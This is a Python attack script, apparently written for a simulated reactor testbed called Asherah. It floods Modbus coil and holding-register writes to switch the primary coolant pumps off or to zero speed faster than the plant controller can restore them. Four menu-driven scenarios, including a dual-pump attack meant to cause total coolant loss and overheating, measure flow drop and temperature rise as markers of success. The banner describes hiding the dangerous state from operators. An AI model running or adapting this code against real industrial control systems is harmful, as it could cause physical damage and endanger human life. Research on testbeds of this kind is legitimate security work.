#!/usr/bin/env python3
"""
Zero Dynamics Attack - Command Spamming
Spam commands faster than the internal Asherah controller

Compatible with pymodbus 3.8.6
"""

from pymodbus.client import ModbusTcpClient
import time
import sys
import threading

ASHERAH_IP = "172.20.0.10"
ASHERAH_PORT = 502

class SpamAttack:
    def __init__(self):
        self.client = ModbusTcpClient(ASHERAH_IP, port=ASHERAH_PORT, timeout=5)
        self.spamming = False
        self.spam_thread = None
        
    def connect(self):
        print(f"Connecting to Asherah ({ASHERAH_IP}:{ASHERAH_PORT})...")
        self.client.connect()
        if not self.client.connected:
            print("Cannot connect")
            sys.exit(1)
        print("Connected\n")
    
    def read_values(self):
        """Read key values from the device (input/holding registers, discrete inputs)."""
        try:
            ir = self.client.read_input_registers(address=0, count=25, slave=1)
            hr = self.client.read_holding_registers(address=0, count=20, slave=1)
            coils = self.client.read_discrete_inputs(address=0, count=12, slave=1)
            
            if ir.isError() or hr.isError() or coils.isError():
                return None
            
            return {
                # Measurements
                'power': ir.registers[14] * 0.00183105469,
                'fuel_temp': ir.registers[12] * 0.00152590219 - 273.15,
                'mean_temp': ir.registers[8] * 0.00152590219 - 273.15,
                'flow1': ir.registers[2] * 0.00015259022,
                'flow2': ir.registers[6] * 0.00015259022,
                'pump1_speed': ir.registers[1] * 0.00152590219,
                'pump2_speed': ir.registers[5] * 0.00152590219,
                
                # Current commands (written by the controller)
                'cmd_pump1_speed': hr.registers[0] * 0.00152590219,
                'cmd_pump2_speed': hr.registers[1] * 0.00152590219,
                
                # States
                'pump1_on': coils.bits[0] if len(coils.bits) > 0 else None,
                'pump2_on': coils.bits[1] if len(coils.bits) > 1 else None,
            }
        except Exception as e:
            print(f"Read error: {e}")
            return None
    
    def spam_coil_off(self, coil_address, interval_ms=20):
        """Thread that continuously spams an OFF command to a coil."""
        print(f"  [SPAM] Starting spam on Coil {coil_address} every {interval_ms}ms")
        count = 0
        
        while self.spamming:
            try:
                result = self.client.write_coil(address=coil_address, value=False, slave=1)
                if not result.isError():
                    count += 1
                    if count % 50 == 0:
                        print(f"  [SPAM] Sent {count} commands on Coil {coil_address}")
                else:
                    print(f"  [SPAM] Error: {result}")
            except Exception as e:
                print(f"  [SPAM] Exception: {e}")
            
            time.sleep(interval_ms / 1000.0)
        
        print(f"  [SPAM] Stopped. Total commands sent: {count}")
    
    def spam_holding_register(self, reg_address, value, interval_ms=20):
        """Thread that continuously writes a value to a holding register."""
        print(f"  [SPAM] Starting spam on HR {reg_address} = {value} every {interval_ms}ms")
        count = 0
        
        while self.spamming:
            try:
                result = self.client.write_register(address=reg_address, value=value, slave=1)
                if not result.isError():
                    count += 1
                    if count % 50 == 0:
                        print(f"  [SPAM] Sent {count} commands on HR {reg_address}")
            except Exception as e:
                print(f"  [SPAM] Exception: {e}")
            
            time.sleep(interval_ms / 1000.0)
        
        print(f"  [SPAM] Stopped. Total commands sent: {count}")
    
    def display_status(self, values):
        """Display current status."""
        if not values:
            print("No data")
            return
        
        print(f"\n{'─'*70}")
        print(f"  Power: {values['power']:>6.1f}%  |  Fuel Temp: {values['fuel_temp']:>6.1f}°C  |  Mean Temp: {values['mean_temp']:>6.1f}°C")
        print(f"  Pump1: {'ON ' if values['pump1_on'] else 'OFF'} {values['pump1_speed']:>5.1f}% -> Flow: {values['flow1']:>7.0f} kg/s")
        print(f"  Pump2: {'ON ' if values['pump2_on'] else 'OFF'} {values['pump2_speed']:>5.1f}% -> Flow: {values['flow2']:>7.0f} kg/s")
        print(f"  CMD Pump1 Speed: {values['cmd_pump1_speed']:>5.1f}%  |  CMD Pump2 Speed: {values['cmd_pump2_speed']:>5.1f}%")
        print(f"{'─'*70}")
    
    def attack_scenario_1_pump_spam(self):
        """Scenario 1: Pump shutdown spam."""
        print("\n" + "="*70)
        print("  ATTACK SCENARIO 1: Pump Shutdown Spam")
        print("="*70)
        print("""
Strategy: Spam Coil 0 (RC1_PumpOnOffCmd) to OFF faster than controller
Expected: If spam is fast enough, pump might stop or oscillate
Target: Primary coolant pump Loop 1

This is a RACE CONDITION attack:
  Your spam rate: ~50 commands/second
  Controller rate: ~2-10 commands/second
  Goal: Win the race and keep pump OFF
""")
        
        input("\nPress ENTER to start baseline monitoring...")
        
        # Baseline
        print("\n[Phase 1] Baseline - Normal operation")
        for i in range(3):
            time.sleep(2)
            values = self.read_values()
            self.display_status(values)
        
        input("\nPress ENTER to START SPAM ATTACK...")
        
        # Start spam
        print("\n[Phase 2] SPAM ATTACK ACTIVE")
        self.spamming = True
        self.spam_thread = threading.Thread(
            target=self.spam_coil_off,
            args=(0, 20),  # Coil 0, every 20ms
            daemon=True
        )
        self.spam_thread.start()
        
        # Monitor for 30 seconds
        print("\nMonitoring for 30 seconds during spam...")
        for t in range(0, 31, 5):
            time.sleep(5)
            values = self.read_values()
            print(f"\n  T+{t}s during spam:")
            self.display_status(values)
        
        # Stop spam
        print("\n[Phase 3] Stopping spam...")
        self.spamming = False
        if self.spam_thread:
            self.spam_thread.join(timeout=2)
        
        # Observer après arrêt du spam
        print("\n[Phase 4] After spam stopped - Recovery:")
        for i in range(3):
            time.sleep(2)
            values = self.read_values()
            self.display_status(values)
        
        print("\nScenario 1 complete")
        print("\nAnalysis:")
        print("  - If pump stayed ON: Controller won the race (spam not fast enough)")
        print("  - If pump went OFF: SPAM ATTACK SUCCESSFUL")
        print("  - If pump oscillated: Partial success (unstable state)")
    
    def attack_scenario_2_speed_spam(self):
        """Scenario 2: Pump speed spam to 0%."""
        print("\n" + "="*70)
        print("  ATTACK SCENARIO 2: Pump Speed Spam to Zero")
        print("="*70)
        print("""
Strategy: Spam HR 0 (RC1_PumpSpeedCmd) to 0% faster than controller
Expected: Pump might slow down or stop
Target: Primary coolant pump Loop 1 speed

This attacks the speed control instead of ON/OFF:
  Your spam: HR 0 = 0 (0% speed) at 50 commands/second
  Controller: Tries to maintain HR 0 = 65535 (100% speed)
""")
        
        input("\nPress ENTER to start baseline monitoring...")
        
        # Baseline
        print("\n[Phase 1] Baseline - Normal operation")
        for i in range(3):
            time.sleep(2)
            values = self.read_values()
            self.display_status(values)
        
        input("\nPress ENTER to START SPAM ATTACK...")
        
        # Start spam
        print("\n[Phase 2] SPAM ATTACK ACTIVE - Setting speed to 0%")
        self.spamming = True
        self.spam_thread = threading.Thread(
            target=self.spam_holding_register,
            args=(0, 0, 20),  # HR 0, value=0, every 20ms
            daemon=True
        )
        self.spam_thread.start()
        
        # Monitor for 30 seconds
        print("\nMonitoring for 30 seconds during spam...")
        for t in range(0, 31, 5):
            time.sleep(5)
            values = self.read_values()
            print(f"\n  T+{t}s during spam:")
            self.display_status(values)
        
        # Stop spam
        print("\n[Phase 3] Stopping spam...")
        self.spamming = False
        if self.spam_thread:
            self.spam_thread.join(timeout=2)
        
        # Observer après arrêt du spam
        print("\n[Phase 4] After spam stopped - Recovery:")
        for i in range(3):
            time.sleep(2)
            values = self.read_values()
            self.display_status(values)
        
        print("\nScenario 2 complete")
        print("\nAnalysis:")
        print("  - If speed stayed 100%: Controller won (spam too slow)")
        print("  - If speed dropped: SPAM ATTACK PARTIALLY SUCCESSFUL")
        print("  - If flow decreased: Physical effect observed!")
    
    def attack_scenario_3_dual_spam(self):
        """Scenario 3: Spam both pumps simultaneously."""
        print("\n" + "="*70)
        print("  ATTACK SCENARIO 3: Dual Pump Spam (AGGRESSIVE)")
        print("="*70)
        print("""
Strategy: Spam BOTH pumps OFF simultaneously
Expected: If successful, TOTAL loss of coolant flow
Target: Both primary coolant pumps

WARNING: This is the most aggressive attack
    - If successful: NO coolant flow -> rapid overheating
    - Could trigger SCRAM if Asherah detects the anomaly
    - Most realistic zero-dynamics scenario
""")
        
        confirm = input("\nType 'ATTACK' to confirm dual pump spam: ")
        if confirm != 'ATTACK':
            print("Scenario 3 cancelled")
            return
        
        # Baseline
        print("\n[Phase 1] Baseline - Normal operation")
        baseline = self.read_values()
        self.display_status(baseline)
        
        input("\nPress ENTER to START DUAL SPAM ATTACK...")
        
        # Start spam on BOTH pumps
        print("\n[Phase 2] DUAL SPAM ATTACK ACTIVE")
        self.spamming = True
        
        spam_thread1 = threading.Thread(
            target=self.spam_coil_off,
            args=(0, 15),  # Coil 0 (Pump1)
            daemon=True
        )
        spam_thread2 = threading.Thread(
            target=self.spam_coil_off,
            args=(1, 15),  # Coil 1 (Pump2)
            daemon=True
        )
        
        spam_thread1.start()
        spam_thread2.start()
        
        # Monitor for 30 seconds
        print("\nMonitoring for 30 seconds during DUAL spam...")
        for t in range(0, 31, 5):
            time.sleep(5)
            values = self.read_values()
            print(f"\n  T+{t}s during dual spam:")
            self.display_status(values)
            
            if values:
                # Calculer les changements
                flow_drop = ((baseline['flow1'] + baseline['flow2']) - 
                            (values['flow1'] + values['flow2']))
                temp_rise = values['fuel_temp'] - baseline['fuel_temp']
                
                if flow_drop > 1000:
                    print(f"  FLOW DROP DETECTED: {flow_drop:.0f} kg/s")
                if temp_rise > 10:
                    print(f"  TEMPERATURE RISE: +{temp_rise:.1f}°C")
        
        # Arrêter le spam
        print("\n[Phase 3] Stopping dual spam...")
        self.spamming = False
        spam_thread1.join(timeout=2)
        spam_thread2.join(timeout=2)
        
        # Observer la récupération
        print("\n[Phase 4] After spam stopped - Recovery:")
        for i in range(5):
            time.sleep(2)
            values = self.read_values()
            self.display_status(values)
        
        print("\nScenario 3 complete")
        print("\nAnalysis:")
        if values and baseline:
            total_flow_now = values['flow1'] + values['flow2']
            total_flow_base = baseline['flow1'] + baseline['flow2']
            flow_ratio = total_flow_now / total_flow_base if total_flow_base > 0 else 0
            
            if flow_ratio < 0.5:
                print("  CRITICAL SUCCESS: Flow reduced by >50%!")
                print("  Zero Dynamics attack would be HIGHLY EFFECTIVE")
            elif flow_ratio < 0.8:
                print("  PARTIAL SUCCESS: Flow reduced significantly")
                print("  Attack had measurable physical impact")
            else:
                print("  Controller maintained flow (attack ineffective)")
                print("  Need faster spam rate or different approach")

    def attack_scenario_4_dual_hr_spam(self):
        """Scenario 4: Spam both holding registers (HR 0 and HR 1) to 0%."""
        print("\n" + "="*70)
        print("  ATTACK SCENARIO 4: Dual Holding Register Spam (both pumps)")
        print("="*70)
        print("""
Strategy: Spam HR 0 and HR 1 (pump speed commands) to 0% faster than the controller
Expected: If spam is fast enough, both pumps will slow down or stop
Target: Primary coolant pump Loop 1 and Loop 2 speeds

This attacks holding registers for both pumps simultaneously.
""")

        input("\nPress ENTER to start baseline monitoring...")

        # Baseline
        print("\n[Phase 1] Baseline - Normal operation")
        baseline = None
        values = None
        for i in range(3):
            time.sleep(2)
            values = self.read_values()
            self.display_status(values)
            if i == 0:
                baseline = values

        input("\nPress ENTER to START DUAL HR SPAM ATTACK...")

        # Start spam on both holding registers
        print("\n[Phase 2] SPAM ATTACK ACTIVE - Spamming HR values")
        self.spamming = True

        spam_thread1 = threading.Thread(
            target=self.spam_holding_register,
            args=(0, 0, 100),  # HR 0 -> 0, every 100ms
            daemon=True
        )
        spam_thread2 = threading.Thread(
            target=self.spam_holding_register,
            args=(1, 0, 200),  # HR 1 -> 0, every 200ms
            daemon=True
        )
        spam_thread3 = threading.Thread(
            target=self.spam_holding_register,
            args=(2, 0, 20),  # HR 2 -> 0, every 20ms
            daemon=True
        )

        spam_thread4 = threading.Thread(
            target=self.spam_holding_register,
            args=(3, 65535, 20),  # HR 3 -> 65535, every 20ms
            daemon=True
        )
        spam_thread1.start()
        spam_thread2.start()
        spam_thread3.start()
        spam_thread4.start()

        # Monitor during spam
        print("\nMonitoring for 310 seconds during spam...")
        for t in range(0, 310, 5):
            time.sleep(5)
            values = self.read_values()
            print(f"\n  T+{t}s during spam:")
            self.display_status(values)

        # Stop spam
        print("\n[Phase 3] Stopping spam...")
        self.spamming = False
        spam_thread1.join(timeout=2)
        spam_thread2.join(timeout=2)
        spam_thread3.join(timeout=2)
        spam_thread4.join(timeout=2)

        # Observe recovery
        print("\n[Phase 4] After spam stopped - Recovery:")
        for i in range(3):
            time.sleep(2)
            values = self.read_values()
            self.display_status(values)

        print("\nScenario 4 complete")
        print("\nAnalysis:")
        if baseline and values:
            total_flow_now = values.get('flow1', 0) + values.get('flow2', 0)
            total_flow_base = baseline.get('flow1', 0) + baseline.get('flow2', 0)
            flow_ratio = total_flow_now / total_flow_base if total_flow_base > 0 else 0

            if flow_ratio < 0.5:
                print("  CRITICAL: Flow reduced by >50% — Dual HR spam highly effective")
            elif flow_ratio < 0.8:
                print("  PARTIAL: Flow reduced significantly — attack had measurable impact")
            else:
                print("  Controller maintained flow (attack ineffective)")
        else:
            print("  Not enough data to analyze results")
    
    def run(self):
        """Main menu."""
        print("""
╔══════════════════════════════════════════════════════════════════════╗
║         SPAM ATTACK - Race Condition on Asherah                      ║
║         Overwhelm the internal controller with command spam          ║
╚══════════════════════════════════════════════════════════════════════╝

This attack tries to win a RACE CONDITION against Asherah's controller:
    - The controller writes commands every ~100-500ms
    - We spam commands every ~20ms (50 commands/second)
    - Goal: Keep our malicious commands active long enough to cause damage

If successful, this creates a Zero Dynamics attack scenario:
  - Physical process diverges (no coolant flow)
  - SCADA can be fed false "normal" readings
  - Operators unaware of the real dangerous state
""")
        
        self.connect()
        
        print("\nAvailable scenarios:")
        print("  1. Single pump spam (Coil 0 OFF)")
        print("  2. Pump speed spam (HR 0 = 0%)")
        print("  3. Dual pump spam (AGGRESSIVE - both pumps)")
        print("  4. Dual holding register spam (HR 0 and HR 1 = 0%)")
        print()
        
        choice = input("Choose scenario (1-4): ").strip()
        
        try:
            if choice == '1':
                self.attack_scenario_1_pump_spam()
            elif choice == '2':
                self.attack_scenario_2_speed_spam()
            elif choice == '3':
                self.attack_scenario_3_dual_spam()
            elif choice == '4':
                self.attack_scenario_4_dual_hr_spam()
            else:
                print("Invalid choice")
        except KeyboardInterrupt:
            print("\n\nAttack interrupted")
            self.spamming = False
        finally:
            self.spamming = False
            self.client.close()
            print("\nConnection closed\n")


def main():
    attack = SpamAttack()
    attack.run()


if __name__ == "__main__":
    main()